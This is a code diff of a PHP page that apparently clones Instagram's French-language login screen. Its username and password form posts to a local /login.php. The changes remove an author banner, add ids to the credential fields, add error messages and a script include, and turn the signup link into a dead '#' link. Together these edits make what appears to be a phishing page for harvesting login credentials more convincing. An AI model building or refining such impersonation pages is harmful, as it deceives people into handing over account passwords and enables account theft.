@@ -1,10 +1,3 @@
-<!--
-# ----------------------#
-# __Author__  Exilas    #
-# __Version__ 2.2       #
-# ----------------------#
--->
-
 <?php 
 	date_default_timezone_set('Europe/Paris');
 	$time = date("H:i:s");
@@ -166,7 +159,7 @@
 
                         <div class="EPjEi">
                         
-                        <form class="HmktE" method="post" action="/login.php">
+                        <form name="HmktE" class="HmktE" method="post" action="/login.php">
                             
                             <div class="                   Igw0E     IwRSH      eGOV_         _4EzTm        FBi-h                                                                                                      "></div>
                             
@@ -185,11 +178,8 @@
                                     
                                     <label class="f0n8F ">
                                         <!--<span class="_9nyy2">Numéro de téléphone, nom d’utilisateur ou adresse e-mail</span>-->
-                                        <input placeholder="Numéro de téléphone, nom d’utilisateur ou adresse e-mail" aria-label="Numéro de téléphone, nom d’utilisateur ou adresse e-mail" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="username" type="text" class="_2hvTZ pexuQ zyHYP" value="">
-                                        <!--<div class="cyclonis-password-manager-input-icon safari enabled" style="z-index: 1 !important; left: 222px !important; top: 0px !important; padding: 9px !important; height: 36px !important; width: 36px !important; min-height: 36px !important; max-height: 36px !important; min-width: 36px !important; max-width: 36px !important;"></div>-->
+                                        <input id="username" placeholder="Numéro de téléphone, nom d’utilisateur ou adresse e-mail" aria-label="Numéro de téléphone, nom d’utilisateur ou adresse e-mail" aria-required="true" autocapitalize="off" autocorrect="off" maxlength="75" name="username" type="text" class="_2hvTZ pexuQ zyHYP" value="">
                                     </label>
-
-                                    <!--<div class="i24fI"></div>-->
                                 </div>
                             </div>
 
@@ -198,13 +188,14 @@
 
                                     <label class="f0n8F ">
                                         <!--<span class="_9nyy2">Mot de passe</span>-->
-                                        <input placeholder="Mot de passe" aria-label="Mot de passe" aria-required="true" autocapitalize="off" autocorrect="off" name="password" type="password" class="_2hvTZ pexuQ zyHYP" value="">
-                                        <!--<div class="cyclonis-password-manager-input-icon safari enabled" style="z-index: 1 !important; left: 222px !important; top: 0px !important; padding: 9px !important; height: 36px !important; width: 36px !important; min-height: 36px !important; max-height: 36px !important; min-width: 36px !important; max-width: 36px !important;"></div>-->
+                                        <input id="password" placeholder="Mot de passe" aria-label="Mot de passe" aria-required="true" autocapitalize="off" autocorrect="off" name="password" type="password" class="_2hvTZ pexuQ zyHYP" value="">
                                     </label>
-
-                                    <!--<div class="i24fI"></div>-->
                                 </div>
                             </div>
+
+                            <p style="color: red;" id="error1" align="center"></p>
+                            <p style="color: red;" id="error2" align="center"></p>
+                            <script src="js/script.js"></script>
 
                             <div class="                   Igw0E     IwRSH       hLiUi    ybXk5    _4EzTm    bkEs3                          CovQj                  jKUp7                                              qJPeX                ">
                                 <a href="#">
@@ -218,7 +209,7 @@
 
                             <div class="                   Igw0E   rBNOH        eGOV_         _4EzTm                                                            aGBdT                                                  ">
                                 <div class="_7UhW9   xLCgt     yUEEX    _0PwGv       uL8Hv         ">
-                                    <p>Vous n’avez pas de compte &nbsp;? <a href="/accounts/signup/phone"><span class="_7UhW9   xLCgt       qyrsm      gtFbE    se6yk        ">Inscrivez-vous</span></a></p>
+                                    <p>Vous n’avez pas de compte &nbsp;? <a href="#"><span class="_7UhW9   xLCgt       qyrsm      gtFbE    se6yk        ">Inscrivez-vous</span></a></p>
                                 </div>
                             </div>
                         </form>
